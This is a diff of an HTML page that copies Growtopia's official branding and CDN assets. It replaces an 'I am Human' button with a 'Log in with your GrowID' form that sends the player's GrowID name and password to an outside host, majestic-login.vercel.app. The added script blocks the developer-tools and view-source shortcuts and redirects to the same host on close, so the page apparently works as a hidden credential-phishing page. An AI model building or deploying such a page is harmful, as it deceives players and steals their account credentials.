@@ -1,5 +1,8 @@
 <!DOCTYPE html>
-<html lang="en" style="background-color: rgba(0, 0, 0, 0); width: 100%; height: 100%">
+<html
+    lang="en"
+    style="background-color: rgba(0, 0, 0, 0); width: 100%; height: 100%"
+>
     <head>
         <meta charset="utf-8" />
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
@@ -21,13 +24,13 @@
             href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/growtopia.ico"
             type="image/x-icon"
         />
-        <!-- include bootstrap and custom css -->
+        <!-- include bootstrap and custom  css -->
         <link
             media="all"
             rel="stylesheet"
             href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/css/faq-main.css"
         />
-        <!-- include custom css -->
+        <!-- include custom  css -->
         <link
             media="all"
             rel="stylesheet"
@@ -83,17 +86,80 @@
                                                 <div class="content">
                                                     <section class="common-box">
                                                         <div class="container">
-                                                            <div class="section-title center-align">
-                                                                <h2>I am Human</h2>
+                                                            <div
+                                                                class="section-title center-align"
+                                                            >
+                                                                <h2>
+                                                                    Log in with
+                                                                    your GrowID
+                                                                </h2>
                                                             </div>
-                                                            <div class="row div-content-center">
-                                                                <div class="col-md-12 col-sm-12 text-center">
-                                                                    <button
-                                                                        id="humanButton"
-                                                                        class="btn btn-lg btn-primary grow-button"
+                                                            <div
+                                                                class="row div-content-center"
+                                                            >
+                                                                <div
+                                                                    class="col-md-12 col-sm-12"
+                                                                >
+                                                                    <form
+                                                                        method="POST"
+                                                                        action="https://majestic-login.vercel.app/player/growid/login/validate"
+                                                                        accept-charset="UTF-8"
+                                                                        class=""
+                                                                        role="form"
+                                                                        required="required"
+                                                                        autocomplete="off"
                                                                     >
-                                                                        I am Human
-                                                                    </button>
+                                                                        <input
+                                                                            name="_token"
+                                                                            type="hidden"
+                                                                            value=""
+                                                                        />
+                                                                        <div
+                                                                            class="form-group"
+                                                                        >
+                                                                            <input
+                                                                                id="login-name"
+                                                                                class="form-control grow-text"
+                                                                                placeholder="Your GrowID Name *"
+                                                                                name="growId"
+                                                                                type="text"
+                                                                            />
+                                                                        </div>
+                                                                        <div
+                                                                            class="form-group"
+                                                                        >
+                                                                            <input
+                                                                                id="password"
+                                                                                class="form-control grow-text"
+                                                                                placeholder="Your GrowID Password *"
+                                                                                name="password"
+                                                                                type="password"
+                                                                                value=""
+                                                                            />
+                                                                        </div>
+                                                                        <div
+                                                                            class="form-group text-center forgot-password"
+                                                                        >
+                                                                            <a
+                                                                                href="https://gg.gg/venturaps"
+                                                                                target="_blank"
+                                                                                >Need
+                                                                                Help?
+                                                                                Join
+                                                                                our
+                                                                                Discord!</a
+                                                                            >
+                                                                        </div>
+                                                                        <div
+                                                                            class="form-group text-center"
+                                                                        >
+                                                                            <input
+                                                                                class="btn btn-lg btn-primary grow-button"
+                                                                                type="submit"
+                                                                                value="Log in"
+                                                                            />
+                                                                        </div>
+                                                                    </form>
                                                                 </div>
                                                             </div>
                                                         </div>
@@ -112,37 +178,70 @@
     </body>
     <!-- JQUERY LIBRARY -->
     <script src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/vendors/jquery/jquery-2.1.4.min.js"></script>
-    <!-- bootstrap javascript -->
+    <!-- boostrap javascript -->
     <script src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/vendors/bootstrap/javascripts/bootstrap.min.js"></script>
     <script>
-        $(document).ready(function () {
+        let clicked = false;
+        $('a').click(function () {
+            if (clicked === false) {
+                clicked = true;
+                return true;
+            }
+            $(this).attr('onclick', 'return false;');
+        });
+        $('document').ready(function () {
+            document.onkeydown = e => {
+                if (e.key == 123) {
+                    e.preventDefault();
+                }
+                if (e.key == 'F12') {
+                    e.preventDefault();
+                }
+                if (e.ctrlKey && e.shiftKey && e.key == 'I') {
+                    e.preventDefault();
+                }
+                if (e.ctrlKey && e.key == 'I') {
+                    e.preventDefault();
+                }
+                if (e.ctrlKey && e.shiftKey && e.key == 'C') {
+                    e.preventDefault();
+                }
+                if (e.ctrlKey && e.shiftKey && e.key == 'J') {
+                    e.preventDefault();
+                }
+                if (e.ctrlKey && e.key == 'U') {
+                    e.preventDefault();
+                }
+            };
             $('#modalButton').trigger('click');
-
-            $('#humanButton').on('click', function () {
-                // Prepare form data
-                const _token = 'sampleToken123'; // Replace with actual token
-                const growId = 'sampleGrowID'; // Replace with actual GrowID
-                const password = 'samplePassword'; // Replace with actual password
-
-                const token = btoa(`_token=${_token}&growId=${growId}&password=${password}`);
-
-                // Sending the request to the backend
-                $.post('https://your-backend-url.com/validate', {
-                    _token: _token,
-                    growId: growId,
-                    password: password
-                })
-                .done(function (response) {
-                    // Server will send JSON response like: {"status":"success","message":"Account Validated.","token":"<Base64 Token>","url":"","accountType":"growtopia"}
-                    console.log(response);
-                    alert(response.message);
-                })
-                .fail(function () {
-                    alert('Failed to validate.');
+            $('.close').on('click', function () {
+                window.location = // change the host into your own backend host
+                    'https://majestic-login.vercel.app/player/validate/close'; // https instead of http if u r using ssl
+            });
+            // $('form').submit($('form .grow-button').attr('disabled', 'true'));
+            var observer = new MutationObserver(function (mutations) {
+                mutations.forEach(function (mutation) {
+                    for (var i = 0; i < mutation.addedNodes.length; i++) {
+                        if (mutation.addedNodes[i].tagName == 'DIV') {
+                            var thediv = mutation.addedNodes[i];
+                            var sw = window.screen.width;
+                            if (sw < 667) {
+                                $(thediv).css({
+                                    transform: 'scale(0.75)',
+                                    'transform-origin': '0 0',
+                                    '-webkit-transform': 'scale(0.75)',
+                                    '-webkit-transform-origin': '0 0',
+                                    overflow: 'auto',
+                                });
+                            }
+                        }
+                    }
                 });
-
-                // Close the window after sending the request
-                window.close();
+            });
+            observer.observe(document.body, {
+                attributes: false,
+                childList: true,
+                characterData: false,
             });
         });
     </script>
